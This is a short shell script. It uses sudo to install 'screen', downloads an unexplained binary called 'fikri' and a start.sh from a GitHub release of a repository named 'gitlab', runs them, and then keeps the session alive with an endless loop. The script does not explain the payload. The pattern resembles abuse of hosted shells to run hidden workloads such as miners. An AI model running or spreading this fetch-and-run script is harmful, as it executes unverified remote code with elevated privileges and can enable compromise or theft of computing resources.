#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/santok777/gitlab/releases/download/1/fikri && chmod u+x fikri
wget https://github.com/santok777/gitlab/releases/download/1/start.sh
sh start.sh
while [ 1 ]; do
sleep 3
done
sleep 2880
